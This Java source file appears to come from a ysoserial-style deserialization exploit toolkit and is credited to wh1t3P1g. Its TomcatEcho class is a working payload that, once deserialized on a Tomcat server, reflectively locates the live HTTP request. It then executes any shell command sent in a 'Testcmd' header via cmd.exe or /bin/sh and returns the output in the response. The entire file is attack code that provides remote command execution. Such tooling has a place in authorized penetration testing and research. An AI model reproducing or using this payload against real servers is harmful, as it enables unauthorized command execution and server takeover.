package ysoserial.bullet.template.tomcat;

import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2021/6/16
 */
public class TomcatEcho implements Serializable {

    public TomcatEcho() throws Exception {
        Object o;
        Object resp;
        String s;
        boolean done = false;
        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < ts.length; i++) {
            Thread t = ts[i];
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                if (!(o instanceof Runnable)) {
                    continue;
                }

                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List ps = (java.util.List) getFV(o, "processors");
                for (int j = 0; j < ps.size(); j++) {
                    Object p = ps.get(j);
                    o = getFV(p, "req");
                    resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                        done = true;
                    }
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                        writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                        done = true;
                    }
                    if ((s == null || s.isEmpty()) && done) {
                        writeBody(resp, System.getProperties().toString().getBytes());
                    }

                    if (done) {
                        break;
                    }
                }
                if (done) {
                    break;
                }
            }
        }
    }

    private static void writeBody(Object resp, byte[] bs) throws Exception {
        Object o;
        Class clazz;
        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            o = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                .invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (ClassNotFoundException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (NoSuchMethodException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        }
    }

    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }
}

